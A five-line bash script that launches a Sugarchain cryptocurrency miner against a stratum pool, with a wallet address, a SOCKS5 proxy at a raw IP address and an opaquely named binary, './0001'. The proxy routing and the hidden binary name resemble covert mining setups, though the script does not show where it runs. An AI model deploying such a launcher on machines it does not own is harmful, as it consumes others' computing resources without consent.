#!/bin/bash
POOL=stratum+tcp://1pool.sugarchain.org:3333
WALLET=sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y
PROXY=socks5://135.181.179.214:50847
./0001 -a yespowerSUGAR -o $POOL -u $WALLET -t4 -x $PROXY
